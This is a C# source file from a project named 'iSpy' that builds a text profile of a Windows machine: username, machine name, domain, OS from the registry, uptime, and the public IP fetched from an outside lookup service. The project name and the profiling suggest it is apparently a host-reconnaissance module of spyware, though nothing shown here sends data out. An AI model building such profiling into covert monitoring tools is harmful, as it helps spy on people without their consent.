using System;
using Microsoft.Win32;
using System.Net;
using System.Collections.Generic;
using System.Text;

namespace iSpy
{
    public class ComputerInformation
    {
        public static string GetInformation()
        {
            string information = string.Empty;
            try
            {
                information += "Username: " + GetUsername() + Environment.NewLine;
                information += "Machine Name: " + GetMachineName() + Environment.NewLine;
                information += "IP Address: " + GetIP().Trim() + Environment.NewLine;
                information += "Operating System: " + GetOS() + Environment.NewLine;
                information += "User Domain Name: " + Environment.UserDomainName + Environment.NewLine;
                information += "System Uptime: " + (Environment.TickCount / 1000.0 / 60.0 / 60.0) + " Hours" + Environment.NewLine;
            }
            catch (Exception ex) { Config.DumpErrorLog(ex, null); }
            return information;
        }
        public static string GetOS()
        {
            string os = "Unknown";
            try
            {
                os = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion").GetValue("ProductName").ToString();
                if (os.Contains("XP"))
                    os = "Windows XP";
                else if (os.Contains("Vista"))
                    os = "Windows Vista";
                else if (os.Contains("7"))
                    os = "Windows 7";
                else if (os.Contains("8"))
                    os = "Windows 8";
                else
                    os = "Unknown";
            }
            catch (Exception ex) { Config.DumpErrorLog(ex, null); os = "Unknown"; }
            return os;
        }
        public static string GetName()
        {
            return GetUsername() + "\\" + GetMachineName();
        }
        private static string GetUsername()
        {
            return Environment.UserName.ToString();
        }
        private static string GetMachineName()
        {
            return Environment.MachineName.ToString();
        }
        public static string GetIP()
        {
            string ip = string.Empty;
            try
            {
                ip = Encoding.ASCII.GetString(new WebClient().DownloadData("http://ip4.telize.com/"));
            }
            catch (Exception ex) { Config.DumpErrorLog(ex, null); ip = "N/A"; }
            if (ip.Length > 15)
                ip = "N/A";
            return ip;
        }
    }
}
